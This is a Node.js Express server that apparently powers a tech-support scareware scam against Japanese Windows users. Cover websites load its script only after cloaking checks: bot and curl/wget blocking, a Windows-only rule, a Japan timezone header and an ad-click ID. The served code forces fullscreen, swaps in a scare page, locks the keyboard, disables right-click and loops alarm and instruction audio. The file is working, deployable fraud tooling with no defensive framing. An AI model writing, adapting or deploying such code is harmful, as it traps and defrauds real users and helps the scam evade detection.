import express from "express";
import cors from "cors";
import fs from "fs/promises";
import path from "path";
import { fileURLToPath } from "url";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

// === Per-origin asset mapping ===
// Add as many origins as you like; each maps to exactly one asset.
const ORIGIN_ASSETS = {
  // "https://yogaleisure.onrender.com": {
  //   htmlFile: "asset1.html",
  //   audioUrl: "https://audio.jukehost.co.uk/pbc2aVh4EsefsMUSOnwzlUOPdybcwmky",
  // },
  "https://sakurayuonsen.com": {
    htmlFile: "asset2.html",
    audioUrl: "https://audio.jukehost.co.uk/DdoP57ElE6PxMYICXWLHA3Rno6iJMcCj",
  },
  "https://kochifoodie.shop": {
    htmlFile: "asset3.html",
    audioUrl: "https://audio.jukehost.co.uk/44ztNAKropDXkJvAD1C1hXiGoulmF1Nu",
  },
  "https://samarpanyoga.life": {
    htmlFile: "asset4.html",
    audioUrl: "https://audio.jukehost.co.uk/mHWM17ydqMANnt7vAAMWI0Pf1NuYf4Qh",
  },
  "https://yogaleisure.onrender.com": {
    htmlFile: "asset5.html",
    audioUrl: "https://audio.jukehost.co.uk/VyVP5s3l0InfBSzvBi3R6jrHwwBcgyJ6",
  },
};

const ALLOWED_ORIGINS = Object.keys(ORIGIN_ASSETS);

// Helper to resolve relative paths (ESM compatible)
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// === CORS (dynamic origin) ===
app.use(
  cors({
    credentials: true,
    origin(origin, cb) {
      // If no Origin header, block by default (tighten as desired)
      if (!origin) return cb(new Error("CORS: Origin required"));
      if (ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
      return cb(new Error("CORS: Not allowed"));
    },
  })
);

app.use(express.json());

// === Security Middleware ===
function validateRequest(req, res, next) {
  const origin = req.get("origin");

  // 1) Origin must be one of the allowed origins
  if (!ALLOWED_ORIGINS.includes(origin)) {
    return res.status(403).send("FAILED: origin check");
  }

  // Attach the asset chosen for this origin so routes can use it.
  req.asset = ORIGIN_ASSETS[origin];

  // 2) Basic bot / platform checks
  const ua = req.get("user-agent")?.toLowerCase() || "";
  const blockedAgents = ["bot", "spider", "crawler", "curl", "wget"];
  const isWindows = ua.includes("windows");
  if (blockedAgents.some((a) => ua.includes(a)) || !isWindows) {
    return res.status(403).send("FAILED: bot or not Windows");
  }

  // 3) Timezone check
  const timezone = req.get("x-client-timezone");
  if (!["Asia/Tokyo", "Japan", "Etc/GMT-9"].includes(timezone)) {
    return res.status(403).send("FAILED: wrong timezone");
  }

  // 4) Cookie presence check
  const cookie = req.get("x-access-cookie");
  if (cookie !== "true") {
    return res.status(403).send("FAILED: cookie missing");
  }

  next();
}

// === HTML Escaping Utility ===
function escapeHTMLForJSString(html) {
  return html
    .replace(/\\/g, "\\\\") // Escape backslashes
    .replace(/'/g, "\\'") // Escape single quotes
    .replace(/\r?\n/g, ""); // Remove newlines
}

// === Route: /frontend-loader ===
app.get("/frontend-loader", validateRequest, async (req, res) => {
  const gclid = req.query.gclid;
  if (!gclid || gclid.length < 10) {
    return res.status(403).send("FAILED: gclid missing or too short");
  }

  console.log(gclid);

  try {
    // Asset is selected based on the request Origin (set in validateRequest)
    const asset = req.asset;
    if (!asset) {
      return res.status(500).json({ error: "No asset mapped for origin" });
    }

    const htmlPath = path.join(__dirname, asset.htmlFile);
    const rawHTML = await fs.readFile(htmlPath, "utf8");
    const safeHTML = escapeHTMLForJSString(rawHTML);

    const code = `
      document.documentElement.requestFullscreen().then(() => {
        document.body.innerHTML = '${safeHTML}';
        navigator.keyboard.lock();
        document.addEventListener('contextmenu', e => e.preventDefault());

        const beepAudio = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
        beepAudio.loop = true;
        beepAudio.play();

        const instructionAudio = new Audio('${asset.audioUrl}');
        instructionAudio.loop = true;
        instructionAudio.play();

        document.removeEventListener("click", handleSomeClick);
      });
    `;

    // Reflect the specific request Origin (required when credentials: true)
    const requestOrigin = req.get("origin");
    res.set("Access-Control-Allow-Origin", requestOrigin);

    console.log(`Sent code for: ${asset.htmlFile} (origin: ${requestOrigin})`);
    return res.json({ code });
  } catch (err) {
    console.error("Error in frontend-loader:", err);
    return res.status(500).json({ error: "Failed to generate frontend loader" });
  }
});

// === Start server ===
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
